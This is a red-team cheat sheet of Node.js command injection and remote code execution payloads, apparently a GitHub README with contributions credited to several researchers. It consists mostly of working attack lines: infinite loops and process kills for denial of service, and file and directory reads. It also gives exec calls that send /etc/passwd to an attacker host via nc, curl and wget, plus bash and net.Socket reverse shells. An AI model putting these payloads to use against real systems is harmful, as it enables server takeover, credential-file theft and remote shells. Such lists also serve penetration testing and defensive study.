# NodeJS Red Team Cheat Sheet

A curated list of NodeJs Command Injection / RCE Payloads.

### Know the evil functions
`eval()`,`setTimeout()`,`setInterval()`, `Function()`, `unserialize()`

### Know your weapons
`fs` , `child_process`, `net`, `http`

`spawn` = returns a stream, returns huge binary data to Node

`exec` = returns a buffer, should be used to return status

### Attack Vectors

Denial of Service
```javascript
while(1)
```
Exit the running process
```javascript
process.exit()
```

Kill Process
```javascript
process.kill(process.pid)
```

Read current working directory
```javascript
res.end(require('fs').readdirSync('.').toString())
```

Read previous directory
```javascript
res.end(require('fs').readdirSync('..').toString())
```

Read file
```javascript
res.end(require('fs').readFileSync(fname))
```
Spawn Magic ( by [@aaditya_purani](https://twitter.com/aaditya_purani))
```javascript
require('child_process').spawn('ls',['-a']).stdout.on('data', function (data) {console.log('own'+ data); });
```
Child exec ( by [@artsploit](https://twitter.com/artsploit) )
```javascript
require('child_process').exec('cat+/etc/passwd+|+nc+attackerip+80')
```

```javascript
require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')
```

```javascript
require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+attackersip.com')
```
Wget post data (by [@brutelogic](https://twitter.com/brutelogic))
```javascript
require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
```

Using net (by [ibreak.software](http://ibreak.software))
```javascript
var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attackerip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

Using arguments[1] as response object (by [@OrhanAlbay](https://twitter.com/OrhanAlbay))
```javascript
arguments[1].end(require('child_process').execSync('whoami'))
```
```javascript
arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```

### Need More ?
Repository would be mainted time to time. Feel free to contribute.

### Contact
[@aaditya_purani](https://twitter.com/aaditya_purani)
